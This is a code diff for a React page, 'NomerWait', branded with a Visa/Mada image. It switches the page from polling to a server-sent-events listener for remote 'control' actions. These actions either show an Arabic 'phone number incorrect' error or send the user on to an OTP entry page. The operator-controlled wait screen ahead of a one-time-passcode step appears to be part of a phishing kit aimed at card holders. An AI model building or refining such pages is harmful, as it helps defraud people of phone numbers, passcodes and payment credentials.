@@ -1,9 +1,7 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useCallback } from "react";
 import { useLocation } from "wouter";
 import { Header } from "@/components/layout/Header";
 import { Loader2, XCircle } from "lucide-react";
-import { useQuery } from "@tanstack/react-query";
-import { getControlAction } from "@/lib/api";
 import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";
 
 export default function NomerWait() {
@@ -14,26 +12,45 @@ export default function NomerWait() {
   
   const sessionId = localStorage.getItem("sessionId");
   
-  // Check for control messages
-  const { data: controlData } = useQuery({
-    queryKey: ["control", sessionId],
-    queryFn: () => getControlAction(sessionId!),
-    refetchInterval: 1000,
-    enabled: !!sessionId,
-  });
-
-  useEffect(() => {
-    if (!controlData) return;
-    
-    if (controlData.action === "nomer_error") {
-      setError(true);
-      setErrorMessage("رقم الهاتف غير صحيح. يرجى التأكد وإعادة المحاولة.");
-      setMessage("تم رفض الطلب");
-    } else if (controlData.action === "go_otp") {
-      localStorage.setItem("nomerVerified", "true");
-      setLocation("/nomer-otp");
+  // Handle SSE control events
+  const handleSSEMessage = useCallback((event: MessageEvent) => {
+    try {
+      const data = JSON.parse(event.data);
+      
+      if (data.action === "nomer_error") {
+        console.log("[NomerWait] Received nomer error");
+        setError(true);
+        setErrorMessage("رقم الهاتف غير صحيح. يرجى التأكد وإعادة المحاولة.");
+        setMessage("تم رفض الطلب");
+      } else if (data.action === "go_otp") {
+        console.log("[NomerWait] Received go_otp, navigating to nomer-otp");
+        localStorage.setItem("nomerVerified", "true");
+        setLocation("/nomer-otp");
+      }
+    } catch (error) {
+      console.error("[NomerWait] Error parsing SSE message:", error);
     }
-  }, [controlData, setLocation]);
+  }, [setLocation]);
+
+  // Set up SSE listener
+  useEffect(() => {
+    if (!sessionId) return;
+    
+    const apiUrl = import.meta.env.VITE_API_URL || "";
+    const baseUrl = apiUrl || window.location.origin;
+    const sseUrl = `${baseUrl}/api/sse/${sessionId}`;
+    
+    const eventSource = new EventSource(sseUrl);
+    
+    // Listen for control events
+    eventSource.addEventListener("control", handleSSEMessage);
+    
+    // Cleanup
+    return () => {
+      eventSource.removeEventListener("control", handleSSEMessage);
+      eventSource.close();
+    };
+  }, [sessionId, handleSSEMessage]);
 
   useEffect(() => {
     if (error) return;
